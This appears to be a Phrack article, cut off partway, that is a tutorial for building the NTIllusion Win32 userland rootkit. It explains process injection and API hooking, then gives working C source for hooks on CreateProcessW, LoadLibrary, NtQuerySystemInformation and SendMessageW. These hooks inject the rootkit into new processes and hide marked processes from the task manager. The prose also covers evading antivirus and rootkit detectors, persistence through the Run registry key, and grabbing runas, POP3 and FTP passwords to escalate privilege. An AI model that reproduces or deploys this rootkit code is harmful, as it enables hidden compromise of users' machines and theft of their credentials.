@@ -1,0 +1,1749 @@
+
+                           ==Phrack Inc.==
+
+              Volume 0x0b, Issue 0x3e, Phile #0x0c of 0x10
+
+
+|=---------=[  NTIllusion: A portable Win32 userland rootkit  ]=--------=|
+|=----------------------------------------------------------------------=|
+|=------------------=[  Kdm <Kodmaker@syshell.org>  ]=------------------=|
+
+This paper describes how to build a windows user land rootkit. The first
+part deal with the basis and describe a few methods to show how code
+injection and code interception are possible, while the rest of the paper
+covers the strategy that makes stealth possible in userland. A bigger
+version of the paper is also available at [1] so that novice peoples can
+refer to a preliminary article about injection and interception basics.
+
+
+Table of contents
+
+1. Introduction
+2. Code Injection and interception
+	2.1. System Hooks
+	2.2. CreateRemoteThread
+	2.3. Manipulating thread's context
+	2.4. Redirecting the Import Address Table
+	2.5. Inserting an unconditional jump (jmp)
+3. User land take over
+	3.1. User land vs Kernel land rootkits
+	3.2. Restrictions...
+	3.3. ...and constraints
+	3.4. Setting a global hook to take over userland
+	3.5. Local application take over
+4. Replacement functions
+	4.1. Process hiding
+	4.2. File hiding
+	4.3. Registry
+	4.4. Netstat like tools.
+	     4.4.1. The case of windows 2000
+	          4.4.1.1. Hooking GetTcpTable
+	          4.4.1.2. Defeating netstat
+	          4.4.1.2. Defeating Fport
+	     4.4.2. The case of windows XP
+	4.5. Global TCP backdoor / password grabber
+	4.6. Privilege escalation
+	4.7. Module stealth
+5. Ending
+	5.1. Conclusion
+	5.2. Greets
+6. References
+
+
+-------[ 1. Introduction
+  A rootkit is a program designed to control the behavior of a given 
+machine. This is often used to hide the illegitimate presence of a 
+backdoor and others such tools. It acts by denying the listing of certain 
+elements when requested by the user, affecting thereby the confidence that
+the machine has not been compromised. 
+
+There are different kinds of rootkits. Some act at the very bases of the 
+operating system by sitting in kernel land, under the privileged ring 0 
+mode. Some others run under lower privileges in ring 3 and are called user 
+land rootkits, as they target directly the user's applications instead of 
+the system itself. These ring 3 rootkits have encountered a recrudescence 
+the last years since it is somewhat more portable and polyvalent than ring 
+0 ones.
+As there are multiple ways to stay unseen under windows, this article
+performs a windows rootkitting tutorial based on a strong implementation
+called the [NTillusion rootkit] which fits maximum constraints.
+
+This rootkit has been designed to be able to run under the lowest 
+privileges for a given account under windows. Indeed, it doesn't use any 
+administrative privilege to be able to perform its stealth as it resides 
+directly inside processes that are owned by the current user. In a word, 
+all the ring 3 programs that a user might use to enumerate files, 
+processes, registry keys, and used ports are closely controlled so they 
+won't reveal unwanted things. Meanwhile, the rootkit silently waits for 
+passwords, allowing the load of any device driver as soon as an 
+administrator password is caught.
+
+How does this works?
+All this stuff is done in two steps. First, by injecting the rootkit's 
+code inside each application owned by the current user and finally, by 
+replacing strategic functions by provided ones. Theses tricks are 
+performed at run time against a running process rather than on hard disk 
+on binaries since it allows to work around the windows file protection, 
+antiviral and checksum tools as well. The rootkit has been tested 
+successfully under windows 2000/XP, but may also run on older NTs. It's
+architecture allows it to be ported to windows 9x/Me but some functions
+are missing (VirtualAllocEx) or behave abnormally (CreateRemoteThread) on
+this version of the OS.
+
+This introduction would not have been achieved without comments about the 
+different sections of the paper that present each special characteristics.
+Section 3 deals about user land take over. This mechanism has already been
+presented by Holy_Father in [HIDINGEN]. However it is here done in a 
+different way. In fact, the rootkit acts globally a level higher so things
+are changed and it results in a somewhat simpler but efficient spreading
+method. And contrary to Hacker Defender ([HKDEF_RTK]), NTillusion does not
+need the administrative privilege. So the approach I propose is different.
+This approach is also different when speaking about the way functions are
+chosen and replaced.
+This is the case with section 4 which introduces an uncommon way to 
+replace original functions. On one hand, the functions are most of the time
+replaced at kernel level. So, I hope this paper shows that performing a
+good stealth is possible also in userland. On the other hand when thinking
+about API replacement, people try to dig as much as possible in order to
+hook at the lowest level. This is sometimes a good thing, sometimes not.
+This is especially true with portability, which suffers from this run to
+low level. NTillusion replaces top level APIs as often as possible.
+As windows designers want programs that rely on the documented API to be
+portable from one windows version to another, and as the rootkit hijacks
+critical functions among this documented API, portability is accrued.
+Thereby there's no need to perform OS version check and it results in a
+more universal rootkit. Added to that, this section offers a new way for
+privilege escalation by showing how hooking the POP3/FTP traffic is
+possible in order to get login and passwords. 
+
+This is not the only new thing: section 4.7 offers a new way to hide a DLL
+loaded inside a given process. Usually, this would have been done by
+hooking modules enumeration APIs inside the memory space of each process
+able to reveal the rootkit. However I show how this is possible to do this
+by dealing directly with undocumented structures pointed by the Process
+Environment Block. Once this has been done, there's not need to worry
+about subsequent detection. To test this method I downloaded a rootkit
+detector, [VICE], and scaned my system. With no rootkit loaded, VICE
+produced most of the time some false positive for standart DLLs (kernel32/
+ntdll/...). Once the rootkit was loaded and using this technique, there
+was no noticable change and VICE was still accusing some system DLLs to be
+rootkits as before but there was no record about kNTIllusion.dll that was
+however doing the job efficiently. 
+
+
+
+-------[ 2. Code Injection and interception
+The goal of this section is to allow a process to replace the functions
+of another. This involves getting control of the target process, then
+to replace parts of it's memory carefully. Let's begin with code injection.
+So altering the behavior of a process requires to break into it's memory 
+space in order to execute some code to do the job. Fortunately, windows 
+perfors checks to prevent an application to read or write memory of an 
+other application without its permission. Nevertheless the windows 
+programmers included several ways to bypass the native inter-process 
+protection so patching other processes' memory at runtime is a true 
+possibility. The first step in accessing a running process is done trough 
+the OpenProcess API. If the application possesses the correct security 
+permissions, the function returns a handle to deal with the process, in 
+the other case, it denies access. By triggering a proper privilege, a user 
+may get access to a privilegded process as we'll see later. In Windows NT, 
+a privilege is some sort of flag granted to a user that allows the user to
+override what would normally be a restriction to some part of the
+operating system. This is the bright side. But unfortunately there is
+also a seamy side. In fact there's multiple ways to break into the memory
+space of a running process and running hostile code in it, by using 
+documented functions of the windows API. The following methods have
+already been covered in the past so I will only give an overview.
+
+
+-------[ 2.1. System Hooks
+The most known technique uses the SetWindowsHookEx function which sets a 
+hook in the message event handler of a given application. When used as a 
+system hook, i.e. when the hook is set for the whole userland, by relying 
+on a code located in a dll, the operating system injects the dll into each 
+running process matching the hook type. For example, if a WH_KEYBOARD hook 
+is used and a key is pressed under notepad, the system will map the hook's 
+dll inside notepad.exe memory space. Easy as ABC... For more information
+on the topic, see [HOOKS] and [MSDN_HOOKS]. Hooks are most of the time
+used for developping pacthes or automating user manipulations but the
+following method is from far more eloquent.
+
+
+-------[ 2.2. CreateRemoteThread
+Another gift for windows coders is the CreateRemoteThread API. As its name 
+points out, it allows the creation of a thread inside the memory space of 
+a target process. This is explained by Robert Kuster in [3WAYS]. 
+When targeting a process running in a more privileged context, a rootkit
+may acquire God Power by activating the SeDebugPrivilege. For more
+information see the rootkit code. [NTillusion rootkit]
+Although this method seems interesting, it is from far widespread and easy 
+to defeat using a security driver. See also [REMOTETH] for other info.
+More over, any injected DLL with this method will be easily noticed by
+any program performing basic module enumeration. Section 4.7 offers a 
+solution to this problem, while the following section presents a less
+known way to run code inside a target process.
+
+
+-------[ 2.3. Manipulating thread's context
+CreateRemoteThread isn't the only debugging API that may be used to 
+execute code into a target process. The principle of the following 
+technique is to reroute a program's execution flow to malicious code 
+injected in the program's memory space. This involves three steps. 
+First, the injector chooses a thread of this process and suspends it. 
+Then, it injects the code to be executed in the target process memory as 
+before, using VirtualAllocEx/WriteProcessMemory, and changes a few 
+addresses due to changes in memory position. Next, it sets the address of 
+the next instruction to be executed for this thread (eip register) to 
+point to the injected code and restarts the thread. The injected code is 
+then executed in the remote process. Finally it arranges for a jump to the 
+next instruction that should have been executed if the program had 
+followed its normal course, in order to resume its activity as soon as 
+possible. The idea of manipulating the thread's context is exposed in
+[LSD]. Other methods also exist to trigger the load of a given DLL inside
+the memory space of a target process.
+By design, the HKEY_LOCAL_MACHINE\Software\Microsoft\WindowsNT\Current 
+Version\Windows\AppInit_DLLs key gathers the DLL to be loaded by the 
+system inside each process relying on user32.dll. Added to that come the 
+BHO, standing for browser help objects, that act as plugins for web-
+browsers, enabling the load of any sort of code.
+
+But just taking over a process is not enough...
+Once the target process' memory space is under control, it's possible
+to replace its own functions by provided ones.
+Code interception routines are critical since they had to meet efficiency 
+and speed requirements. The methods presented in this section have their 
+own advantages and drawbacks. As for the injection techniques, there's 
+more than one way to do the job. The goal of the methods is to redirect 
+another program's function when it is loaded in memory. For the target 
+program, everything takes place as if it had called the desired functions 
+as usual. But in fact the call is redirected to the replacement API.
+Some methods of API interception are based on features intentionally 
+provided by the designers of the PE format to simplify the loader's task 
+when a module is mapped into memory. The function redirection takes place 
+once the code we inject into the target process is executed. To understand 
+how these methods work, a thorough understanding of the PE format is 
+needed; see [PE] and hang on with courage, the following methods are 
+useful.
+
+
+-------[ 2.4. Redirecting the Import Address Table
+After injecting our code into the application's memory space, it is 
+possible to change its behavior. We use a technique called "API hooking" 
+which involves replacing the API by our own routines. The most common way 
+to do this is to alter the import address table of a given module.
+When a program is executed, its various zones are mapped into memory, and 
+the addresses of the functions it calls are updated according to the 
+windows version and service pack. The PE format provides a clever solution 
+to do this update, without patching every single call. When you compile 
+your program, each call to an external API is not directly pointing to the 
+function's entry point in memory. It is using a jump involving a dword 
+pointer, whose address is among a table called the Import Address Table 
+(IAT), since it contains the address of each imported function. At load 
+time, the loader just needs to patch each entry of the IAT to modify the 
+target of each call for all API.
+Thus, to hijack, we simply patch the IAT to make the memory point to our 
+code instead of the true entry point of the target API. In this way, we 
+have total control over the application, and any subsequent calls to that 
+function are redirected. This general idea of the technique which is
+detailed more in [IVANOV] and [UNLEASHED]. But hooking at IAT level is
+from far a non secure way. Undirect Call may be missed. To prevent this,
+there's only one solution... inserting an unconditional jump!
+
+
+-------[ 2.5. Inserting an unconditional jump (jmp)
+This technique involves modifying the machine code of a given API so that 
+it executes an unconditional jump to a replacement function. Thus any call 
+– direct or indirect – to the hooked API will inevitably be redirected to 
+the new function. This is the type of function redirection used by the 
+Microsoft Detours Library [DETOURS]. In theory, redirection by inserting 
+of an unconditional jump is simple: you simply locate the entry point of 
+the API to be hijacked an insert an unconditional jump to the new 
+function. This technique make us lose the ability to call the original 
+API, however; there are two ways to work around that inconvenience.
+The first is the method used in the famous hxdef rootkit, or Hacker 
+Defender which is now open source [HKDEF_RTK]. The idea is to insert an 
+unconditional jump while saving the overwritten instruction in a buffer 
+zone. When the original API must be called, the redirection engine 
+restores the real API, calls it, then repositions the hook. The problem 
+with this technique is that it is possible to lose the hook. If things go 
+wrong, there is a chance that the hook will not be restored when exiting 
+the API. An even bigger risk is that another thread of the application may 
+access the API between the time it is restored and the time when the hook 
+is repositioned. Thus, as its creator Holy_Father knows, there is a chance 
+that some calls may be lost when using this method.
+
+However, there is another solution for calling the original API. It 
+involves creating a buffer containing the original version of the API's 
+modified memory zone, followed by a jump to and address located 5 bytes 
+after the start of the zone. This jump allows to continue the execution of 
+the original function just after the unconditional jump that performs the 
+redirection to the replacement function. It seems simple?
+
+No, it isn't. One detail that I voluntarily left out until now: the 
+problem of disassembling instructions. In machine code, instructions have
+a variable length. How can we write an unconditional five-byte jump while
+being sure not to damage the target code ("cutting an instruction in
+half")? The answer is simple: in most cases we just use a basic 
+disassembly engine. It allows to recover as many complete instructions as
+required to reach the size of five bytes, i.e. the area just big enough
+the insert the unconditional jump. The useful redirection engine used in
+the rootkit is the one created by Z0MbiE (see [ZOMBIE2]).
+This hooking method, somewhat particular has been covered by Holy_Father.
+Refer to [HKDEF] if you are interested.
+Hum, That's all folks about prerequisite. Now we're going to consider how
+to build a win32 rootkit using these techniques. Le'ts play!
+
+
+
+-------[ 3. User land take over
+-------[ 3.1 User land vs Kernel land rootkits
+Most of the time, to achieve their aim kernel land rootkits simply replace 
+the native API with some of their own by overwriting entries in the 
+Service Descriptor Table (SDT). Against a normal windows system, they 
+don't have to worry about persistence as once the hook is set, it will 
+hijack all subsequent calls for all processes. This isn't the case for 
+win32 ring 3 rootkits, acting at user level. In fact, the hook isn't 
+global as for kernel ones, and the rootkit must run its code inside each 
+process able to reveal its presence.
+Some decide to hook all processes running on the machine including those 
+of the SYSTEM groups. It requires advanced injection techniques, hooking 
+methods and to target API at very low level. 
+Let me explain. Consider we want some directories not to be noticed when 
+browsing the hard drive using explorer. A quick look at explorer.exe's 
+Import Table reveals that it is using FindFirstFileA/W and FindNextFileA/W 
+So we may hook these functions. At first it seems tedious to hook all 
+these functions rather than going a level under. Yeah, these functions 
+rely on the native API ntdll.ZwQueryDirectoryFile, it would be easier to 
+hook this one instead. This is true for a given version of windows. But 
+this isn't ideal for compatibility. The more low level the functions are, 
+the more they're subject to change. Added to that, it is sometimes 
+undocumented. So on the one hand, there's hijacking at low level, more 
+accurate but somewhat hazardous, and on the other hand, hijacking at high 
+level, less accurate, but from far simpler to set up.
+
+NTillusion hijacks API at high level since I never designed it to reside 
+into system processes. Each choice has a bright side and a seamy side.
+The following points describe the restrictions I wanted the rootkit to fit 
+and the constraints windows imposes to processes.
+
+
+-------[ 3.2 Restrictions...
+The rootkit is made to be able to perform its stealth for the current user 
+on the local machine. This is especially designed for cases where 
+administrator level is unreachable for some reason. This shows that 
+getting root is sometimes not necessary to be lurking. It represents a 
+true threat in this case, since windows users have the bad habit to set 
+their maximum privilege on their account instead of triggering it using 
+runas to become admin only when needed. So, if the user is not currently 
+admin, he probably isn't at all, so a user land rootkit will perfectly do 
+the job. Otherwise, it's time to go kernel mode.
+Thus, the rootkit is designed to only require privileges of the current 
+user to become unseen to its eyes, whether this is an admin or not. Then 
+it starts waiting for passwords collected by users using the runas method, 
+allowing privilege escalation. It may also spy web traffic to dynamically 
+grab pop3/ftp passwords on the fly. This is possible but a little bit too 
+vicious...
+
+
+-------[ 3.3 ...and constraints
+As you should now know, windows maintains a native inter-process 
+protection so a process won't access another if this one doesn't belong to 
+its group or does not present the administrator nor debug privilege. So 
+the rootkit will be restrained to affect processes of the current user. 
+Contrariwise, if it got admin privilege, it may add itself to the 
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run key and 
+hide its presence, being then active for all users on the machine.
+Due to the rootkit architecture, privileged processes will be able to see 
+the system as it really is. So remote administration may reveal the 
+rootkit, as much as FTP or HTTP servers running as services. The solution 
+of this problem is to affect also system processes but the task is 
+somewhat desperate and too considerable to just play the game of cat and 
+mouse.
+
+
+-------[ 3.4 Setting a global hook to take over userland
+To be efficient, the rootkit must run under all visible applications that 
+may reveal unwanted presence. Performing an injection try for each running 
+process when the rootkit loads is not a good idea since it won't affect 
+processes that would be run later. A perfect way to achieve this is to set 
+a system wide hook, using SetWindowsHookEx for WH_CBT events. Therefore, 
+the rootkit's dll will be injected into all running graphical processes, 
+as soon, as they appear on screen. Unfortunately, the WH_CBT concerns only 
+processes using user32.dll, therefore it won't affect some console 
+programs. This is the case of windows cmd, netstat, and so on. Thereby, 
+the rootkit must also affect processes so that it will be notified and 
+injected when a process creation is about to be done. This is achieved by 
+hooking the CreateProcessW function into all injected processes. This way, 
+the rootkit will be running inside any newly created process. The 
+CreateProcessW replacement and the system hook are complementary methods. 
+This combination perfectly covers all situations : the execution of a 
+graphical or console process from explorer, the taskmanager or any other 
+application. It also has the advantage to inject the rootkit into the 
+taskmanager when the user triggers Ctrl+Alt+Del. In this case, the 
+taskmanager is created by winlogon which isn't hijacked by the rootkit. 
+But the system hook is injected into as soon as it is created, since it is 
+a graphical process. To prevent a process from being injected twice, the 
+rootkit modifies pDosHeader->e_csum to be equal to NTI_SIGNATURE. When the 
+Dll is loaded it first checks the presence of this signature and exits 
+properly if needed. This is only a safety since a check is performed in 
+DllMain to be sure that the reason DllMain is called matches 
+DLL_PROCESS_ATTACH. This event only triggers when the DLL is first mapped 
+inside the memory space of the application, while subsequent calls to 
+LoadLibrary will only increase load counter for this module and be marked 
+as DLL_THREAD_ATTACH.
+
+The following code is the CreateProcessW replacement of the NTIllusion 
+rootkit. It contains a backdoor by design: if the application name or its 
+command line contains RTK_FILE_CHAR, the process is not hooked, thus 
+allowing some programs not to be tricked by the rootkit. This is useful to 
+launch hidden processes from windows shell that performs a search before 
+delegating the creation of the process to CreateProcessW.
+
+----------------------   EXAMPLE 1   -----------------------------
+BOOL WINAPI MyCreateProcessW(LPCTSTR lpApplicationName, 
+LPTSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes,
+LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, 
+DWORD dwCreationFlags, LPVOID lpEnvironment, 
+LPCTSTR lpCurrentDirectory, LPSTARTUPINFO lpStartupInfo, 
+LPPROCESS_INFORMATION lpProcessInformation)
+{
+	int bResult, bInject=1;
+	char msg[1024], cmdline[256], appname[256];
+	
+
+/* Resolve CreateProcessW function address if it hasn't been filled 
+by IAT hijack. This happens when the function isn't imported at IAT 
+level but resolved at runtime using GetProcAddresss. */
+
+	if(!fCreateProcessW) 
+	{
+        fCreateProcessW = (FARPROC) 
+                fGetProcAddress(GetModuleHandle("kernel32.dll"),
+                                "CreateProcessW");
+		if(!fCreateProcessW) return 0;
+	}
+
+	/* Clear parameters */
+	my_memset(msg, 0, 1024);
+	my_memset(cmdline, 0, 256);
+	my_memset(appname, 0, 256);
+
+	/* Convert application name and command line from unicode : */
+	WideCharToMultiByte(CP_ACP, 0,(const unsigned short *)
+	  lpApplicationName, -1, appname, 255,NULL, NULL);
+	WideCharToMultiByte(CP_ACP, 0,(const unsigned short *)
+	  lpCommandLine, -1, cmdline, 255,NULL, NULL);
+
+	/* Call original function first, in suspended mode */
+	bResult = (int) fCreateProcessW((const unsigned short *)
+	                lpApplicationName,
+	                (unsigned short *)lpCommandLine, lpProcessAttributes, 
+	                lpThreadAttributes, bInheritHandles, CREATE_SUSPENDED 
+	                /*dwCreationFlags*/, lpEnvironment, 
+                    (const unsigned short*)lpCurrentDirectory, 
+                    (struct _STARTUPINFOW *)lpStartupInfo, 
+	                lpProcessInformation);
+	
+	/* inject the created process if its name & command line don't
+   contain RTK_FILE_CHAR */
+	if(bResult)
+	{
+		if( 
+		(lpCommandLine && strstr((char*)cmdline,(char*)RTK_FILE_CHAR)) || 
+		(lpApplicationName && strstr((char*)appname,(char*)RTK_FILE_CHAR)) 
+          )
+        {
+			OutputString("\n[i] CreateProcessW: Giving true sight to 
+			process '%s'...\n", (char*)appname);
+			WakeUpProcess(lpProcessInformation->dwProcessId);
+			bInject = 0;
+		}
+		if(bInject) 
+		    InjectDll(lpProcessInformation->hProcess,
+		              (char*)kNTIDllPath);
+
+		CloseHandle(lpProcessInformation->hProcess);
+		CloseHandle(lpProcessInformation->hThread); 
+		
+	}
+	return bResult;
+}
+---------------------- END EXAMPLE 1 -----------------------------
+
+Note that the child process is created in suspended mode, then injected by 
+the Dll using CreateRemoteThread. The DLL hook function next wakes the 
+current process up by resuming all its threads. This assures that the 
+process has not executed a single line of its own code during the hijack 
+time.
+
+-------[ 3.5 Local application take over
+Being injected into all processes in the system is the first step to take 
+the ownership of user land. When being able to act anywhere, it must keep 
+its control and prevent any newly loaded module to escape the function 
+hooking that has been set in order to hide unwanted things. So it is 
+strongly recommended to filter calls to LoadLibraryA/W/Ex in order to hook 
+modules as soon as they are loaded into memory. The following function 
+demonstrates how to replace LoadLibraryA in order to prevent hooking 
+escape.
+
+----------------------   EXAMPLE 2   -----------------------------
+/* LoadLibrary : prevent a process from escaping hijack by loading a new 
+dll and calling one of its functions */
+HINSTANCE WINAPI MyLoadLibrary( LPCTSTR lpLibFileName )
+{
+	HINSTANCE hInst	= NULL;	/* DLL handle (by LoadLibrary)*/
+	HMODULE   hMod	= NULL;	/* DLL handle (by GetModuleHandle) */
+	char	 *lDll = NULL;		/* dll path in lower case */
+	
+	/* get module handle */
+	hMod = GetModuleHandle(lpLibFileName);
+
+	/* Load module */
+	hInst = (HINSTANCE) fLoadLibrary(lpLibFileName);
+	
+
+	/* Everything went ok? */
+	if(hInst) 
+	{
+		
+		/*  If the DLL was already loaded, don't set hooks a second
+		    time */ 
+		if(hMod==NULL)
+		{
+			/* Duplicate Dll path to perform lower case comparison*/
+			lDll = _strdup( (char*)lpLibFileName );
+			if(!lDll)
+				goto end;
+			/* Convert it to lower case */
+			_strlwr(lDll);
+			
+			/* Call hook function */
+			SetUpHooks((int)NTI_ON_NEW_DLL, (char*)lDll);
+			
+			free(lDll);
+		}		
+	}
+
+end:
+  return hInst;
+}
+---------------------- END EXAMPLE 2 -----------------------------
+
+As the hijacking method used is entry point rewriting, we must check that 
+the DLL has not been yet loaded before performing the hooking. Otherwise, 
+this may trigger an infinite loop when calling the original function. The 
+job is partially done by SetUpHooks that will perform the hooking on 
+already loaded module only at program startup.
+
+About GetProcAddress:
+At first NTillusion rootkit was using an IAT hijacking method in order to 
+replace file, process, registry and network APIs to perform its stealth. 
+Under winXP, all worked perfectly. But when I tested it under win2000 I 
+noticed a unusual behaviour in explorer's IAT. In fact, the loader doesn't 
+fill the IAT correctly for a few functions such as CreateProcessW, so the 
+address written doesn't always correspond to the API entry point 
+[EXPLORIAT]. Scanning the IAT looking for API name instead of it's address 
+does not solve the problem. It seems that explorer is performing something 
+strange... So I moved from an IAT hijacking engine needing to hook 
+GetProcAddress in order to prevent hook escape, to the unconditional jump 
+insertion that does not need to filter calls to this API. Anyway, you can 
+try to hijack GetProcAddress and send the details of each call to debug 
+output. The amount of GetProcAddress calls performed by explorer is 
+amazing and its study, instructive.
+
+
+
+-------[ 4. Replacement functions
+Here comes the most pleasant part of the NTIllusion rootkit, i.e. the core 
+of the replacement functions.
+
+
+-------[ 4.1. Process hiding
+The main target when speaking about process hiding is the taskmanager. 
+Studying its Import Table reveals that it performs direct calls to 
+ntdll.NtQuerySystemInformation, so this time, hijacking API at higher 
+level is useless and the situation leaves no choice. The role of the 
+replacement function is to hide the presence of each process whose image 
+name begins with RTK_PROCESS_CHAR string. Retrieving the processes list is 
+done through a call to the [NtQuerySystemInformation] API.
+
+NTSTATUS NtQuerySystemInformation(
+  SYSTEM_INFORMATION_CLASS SystemInformationClass,
+  PVOID SystemInformation,
+  ULONG SystemInformationLength,
+  PULONG ReturnLength
+);
+
+The NtQuerySystemInformation function retrieves various kinds of system 
+information. When specifying SystemInformationClass to be equal to 
+SystemProcessInformation, the API returns an array of SYSTEM_PROCESS_
+INFORMATION structures, one for each process running in the system. These 
+structures contain information about the resource usage of each process, 
+including the number of handles used by the process, the peak page-file 
+usage, and the number of memory pages that the process has allocated, as 
+described in the MSDN. The function returns an array of 
+SYSTEM_PROCESS_INFORMATION structures though the SystemInformation 
+parameter. 
+
+Each structure has the following layout: 
+typedef struct _SYSTEM_PROCESS_INFORMATION 
+{ 
+    DWORD          NextEntryDelta; 
+    DWORD          dThreadCount; 
+    DWORD          dReserved01; 
+    DWORD          dReserved02; 
+    DWORD          dReserved03; 
+    DWORD          dReserved04; 
+    DWORD          dReserved05; 
+    DWORD          dReserved06; 
+    FILETIME       ftCreateTime;	/* relative to 01-01-1601 */ 
+    FILETIME       ftUserTime;		/* 100 nsec units */ 
+    FILETIME       ftKernelTime;	/* 100 nsec units */ 
+    UNICODE_STRING ProcessName; 
+    DWORD          BasePriority; 
+    DWORD          dUniqueProcessId; 
+    DWORD          dParentProcessID; 
+    DWORD          dHandleCount; 
+    DWORD          dReserved07; 
+    DWORD          dReserved08; 
+    DWORD          VmCounters; 
+    DWORD          dCommitCharge; 
+    SYSTEM_THREAD_INFORMATION  ThreadInfos[1];
+} SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;
+Hiding a process is possible by playing with the NextEntryDelta member of
+the structure, which represents an offset to the next SYSTEM_PROCESS_
+INFORMATION entry. The end of the list is marked by a NextEntryDelta equal
+to zero.
+
+----------------------   EXAMPLE 3   -----------------------------
+/*		MyNtQuerySystemInformation : install a hook at system query 
+level to prevent _nti* processes from being shown.
+Thanks to R-e-d for this function released in rkNT rootkit.
+(error checks stripped)
+*/
+DWORD WINAPI MyNtQuerySystemInformation(DWORD SystemInformationClass, 
+PVOID SystemInformation, ULONG SystemInformationLength, 
+								PULONG ReturnLength)
+{
+	PSYSTEM_PROCESS_INFORMATION pSpiCurrent, pSpiPrec;
+	char *pname = NULL;
+	DWORD rc;	
+
+	/* 1st of all, get the return value of the function */
+	rc = fNtQuerySystemInformation(SystemInformationClass, 
+	      SystemInformation, SystemInformationLength, ReturnLength);
+	
+	/* if sucessful, perform sorting */
+	if (rc == STATUS_SUCCESS)
+	{
+		/* system info */
+		switch (SystemInformationClass)
+		{
+			/* process list */
+		case SystemProcessInformation:			
+			pSpiCurrent = pSpiPrec = (PSYSTEM_PROCESS_INFORMATION) 
+			                           SystemInformation;
+			
+			while (1)
+			{	
+				/* alloc memory to save process name in AINSI 
+				   8bits string charset */
+				pname = (char *) GlobalAlloc(GMEM_ZEROINIT, 
+				    pSpiCurrent->ProcessName.Length + 2);
+								
+				/* Convert unicode string to ainsi */
+				WideCharToMultiByte(CP_ACP, 0, 
+				    pSpiCurrent->ProcessName.Buffer, 
+				    pSpiCurrent->ProcessName.Length + 1, 
+				    pname, pSpiCurrent->ProcessName.Length + 1,
+				    NULL, NULL);
+
+				    /* if "hidden" process*/
+				if(!_strnicmp((char*)pname, RTK_PROCESS_CHAR, 
+				    strlen(RTK_PROCESS_CHAR))) 
+				{
+					/* First process */
+					if (pSpiCurrent->NextEntryDelta == 0) 
+					{							
+					    pSpiPrec->NextEntryDelta = 0;
+						break;
+					}
+					else 
+					{
+						pSpiPrec->NextEntryDelta += 
+						      pSpiCurrent->NextEntryDelta;
+						
+						pSpiCurrent = 
+						(PSYSTEM_PROCESS_INFORMATION) ((PCHAR) 
+						pSpiCurrent + 
+						pSpiCurrent->NextEntryDelta);
+					}
+				}
+				else
+				{
+					if (pSpiCurrent->NextEntryDelta == 0) break;
+					pSpiPrec = pSpiCurrent;
+					
+					/* Walk the list */
+					pSpiCurrent = (PSYSTEM_PROCESS_INFORMATION) 
+					((PCHAR) pSpiCurrent + 
+					pSpiCurrent->NextEntryDelta);
+				}
+				
+				GlobalFree(pname);
+			} /* /while */
+			break;
+		} /* /switch */
+	} /* /if */
+	
+	return (rc);
+}
+---------------------- END EXAMPLE 3 -----------------------------
+
+Previously I said that targeting NtQuerySystemInformation was the only 
+solution. This is not entirely true. It's contrariwise sure that hooking 
+Process32First/Next won't help but it's still possible to do otherwise. 
+At first I chose to hook SendMessage, therefore hiding at ListBox control 
+level. This is a very specific approach to the problem and is 
+undocumented. Spying the behavior of the taskmanager on process creation 
+with Spy++ shows that it uses the row telling about system idling process 
+and changes its name to show the newly created process by sending a 
+LVM_SETITEMTEXT message. So, first it overwrites the content of this 
+ListBox item's line, and then add a new "Idle process" line by sending a 
+LVM_INSERTITEMW message. Filtering these two types of message let us 
+control what the taskmanager shows. Not very professional but efficient.
+
+The following function replaces SendMessageW inside the task manager to 
+prevent the program to send messages related to hidden process.
+
+----------------------   EXAMPLE 4   -----------------------------
+/* MySendMessageW : install a hook at display level (that is to say at 
+ListBox level) to prevent _* processes from being shown */
+LRESULT WINAPI MySendMessageW(
+HWND hWnd,		/* handle of destination window */
+UINT Msg,		/* message to send */
+WPARAM wParam,	/* first message parameter  */
+LPARAM lParam)	/* second message parameter */
+{
+	LPLVITEM pit; /* simple pointer to a LVITEM structure */
+	
+	/* Filter events */
+	if(	Msg==LVM_SETITEM || Msg==LVM_INSERTITEMW || 
+	Msg==LVM_SETITEMTEXTW				)
+	{
+		/* If process name starts by '_', hide it*/
+		if( ((char)(pit->pszText))=='_' )
+		{
+			hWnd=Msg=wParam=lParam=NULL; 
+			return 0;
+		}
+	}
+
+	/* in the other case, just call the genuine function */
+	return fSendMessageW(hWnd,Msg,wParam,lParam);
+}
+---------------------- END EXAMPLE 1 -----------------------------
+
+This very high level hook does the job but it will only work for 
+taskmgr.exe.
+
+
+-------[ 4.2. File hiding
+Another frequently asked question is how to hide files. As explained 
+above, I choose to hook FindFirstFileA/W and FindNextFileA/W. It is from 
+far sufficient to defeat explorer view, the dir command, and all dialog 
+boxes provided by the Common Controls.
+
+According the [MSDN] the FindFirstFile function searches a directory for a 
+file or subdirectory whose name matches the specified name.
+HANDLE FindFirstFile(
+  LPCTSTR lpFileName,
+  LPWIN32_FIND_DATA lpFindFileData
+);
+
+The function takes two parameters. A null-terminated string that specifies 
+a valid directory or path and file name, which can contain wildcard 
+characters (* and ?): lpFileName, and a pointer to a WIN32_FIND_DATA 
+structure that receives information about the found file or subdirectory.
+If the function succeeds, the return value is a search handle used in a 
+subsequent call to FindNextFile or FindClose.
+If the function fails, the return value is INVALID_HANDLE_VALUE. 
+
+The FindFirstFile function is called to begin a file search. If it 
+succeed, the search may be pursued by calling FindNextFile.
+ 
+BOOL FindNextFile(
+  HANDLE hFindFile,
+  LPWIN32_FIND_DATA lpFindFileData
+);
+
+The hFindFile parameter is a handle returned by a previous call to 
+FindFirstFile or FindFirstFileEx function. Like before, the lpFindFileData 
+points to a the WIN32_FIND_DATA structure that receives information about 
+the found file or subdirectory. The structure can be used in subsequent 
+calls to FindNextFile to see the found file or directory. The function 
+succeeds if it returns nonzero.
+
+Let's have a look at the WIN32_FIND_DATA structure. The important member 
+is cFileName which is a null-terminated string that specifies the name of 
+the file.
+
+typedef struct _WIN32_FIND_DATA { 
+  DWORD dwFileAttributes; 
+  FILETIME ftCreationTime; 
+  FILETIME ftLastAccessTime; 
+  FILETIME ftLastWriteTime; 
+  DWORD nFileSizeHigh; 
+  DWORD nFileSizeLow; 
+  DWORD dwReserved0; 
+  DWORD dwReserved1; 
+  TCHAR cFileName[MAX_PATH]; 	  /* full file name */ 
+  TCHAR cAlternateFileName[14];   /* file name in the classic 8.3 
+                                     (filename.ext) file name format. */
+} WIN32_FIND_DATA,  
+*PWIN32_FIND_DATA;
+
+To perform a directory listing, an application calls FindFirstFile, and 
+then calls FindNextFile using the returned handle, until it returns zero.
